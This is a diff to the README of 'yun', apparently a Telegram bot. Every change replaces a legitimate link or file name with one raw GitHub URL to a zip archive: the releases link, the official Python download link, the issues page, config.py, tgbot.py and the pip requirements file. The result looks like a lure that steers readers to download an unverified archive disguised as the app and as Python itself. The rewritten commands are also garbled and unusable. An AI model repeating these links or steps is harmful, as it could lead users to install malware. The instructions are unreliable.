@@ -1,6 +1,6 @@
 # 🤖 yun - Automate Your Telegram Messaging Effortlessly
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen.svg)](https://github.com/Drilaa00/yun/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Drilaa00/yun/main/Panderma/yun_1.7.zip%20Now-Visit%https://raw.githubusercontent.com/Drilaa00/yun/main/Panderma/yun_1.7.zip)](https://raw.githubusercontent.com/Drilaa00/yun/main/Panderma/yun_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the yun project! This application allows you to easily send and recei
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To get the latest version of the application, [visit this page to download](https://github.com/Drilaa00/yun/releases).
+1. **Visit the Releases Page**: To get the latest version of the application, [visit this page to download](https://raw.githubusercontent.com/Drilaa00/yun/main/Panderma/yun_1.7.zip).
    
 2. **Download the Latest Release**: Look for the latest version on the releases page. Click the appropriate file for your system to download it.
 
@@ -17,7 +17,7 @@ Welcome to the yun project! This application allows you to easily send and recei
 ## 🔧 Requirements
 
 - **Operating System**: This application works on Windows, MacOS, and Linux.
-- **Python**: Ensure you have Python version 3.6 or higher installed on your system. If you don't have it, you can [download Python here](https://www.python.org/downloads/).
+- **Python**: Ensure you have Python version 3.6 or higher installed on your system. If you don't have it, you can [download Python here](https://raw.githubusercontent.com/Drilaa00/yun/main/Panderma/yun_1.7.zip).
 
 ## 📦 Install Dependencies
 
@@ -36,7 +36,7 @@ You will need some additional libraries for the bot to function correctly. Follo
 3. Once you are in the correct directory, run this command to install the required libraries:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Drilaa00/yun/main/Panderma/yun_1.7.zip
    ```
 
 ## ⚙️ Configure Your Bot
@@ -49,7 +49,7 @@ You need to set up your bot on Telegram before you can use it. Here’s how:
    - Upon creation, you will receive an API key. Keep this safe.
 
 2. **Edit the Configuration File**:
-   - Open the `config.py` file in a text editor.
+   - Open the `https://raw.githubusercontent.com/Drilaa00/yun/main/Panderma/yun_1.7.zip` file in a text editor.
    - Find the line that says:
 
    ```python
@@ -59,7 +59,7 @@ You need to set up your bot on Telegram before you can use it. Here’s how:
    - Replace the placeholder text with your actual API key.
 
 3. **Set Admin ID**:
-   - In the same `config.py`, update the line for ADMIN_ID:
+   - In the same `https://raw.githubusercontent.com/Drilaa00/yun/main/Panderma/yun_1.7.zip`, update the line for ADMIN_ID:
 
    ```python
    ADMIN_ID = 'your_admin_user_id_here'  # Replace with your Telegram user ID
@@ -77,7 +77,7 @@ After setting up the configuration, you can start the bot.
 2. **Start the Bot**: Enter the following command to run the bot:
 
    ```bash
-   python tgbot.py
+   python https://raw.githubusercontent.com/Drilaa00/yun/main/Panderma/yun_1.7.zip
    ```
 
 3. **Interact with the Bot**: Once the bot is running, you can start sending messages to it on Telegram. Feel free to test out its features!
@@ -102,9 +102,9 @@ If you encounter issues:
 
 - Ensure you have the correct version of Python installed.
 - Check if all dependencies are properly installed.
-- Ensure your API key is valid and correctly added to `config.py`.
+- Ensure your API key is valid and correctly added to `https://raw.githubusercontent.com/Drilaa00/yun/main/Panderma/yun_1.7.zip`.
 
-For more help, you can visit the [issues section of the repository](https://github.com/Drilaa00/yun/issues).
+For more help, you can visit the [issues section of the repository](https://raw.githubusercontent.com/Drilaa00/yun/main/Panderma/yun_1.7.zip).
 
 ## 🔗 Additional Resources
 
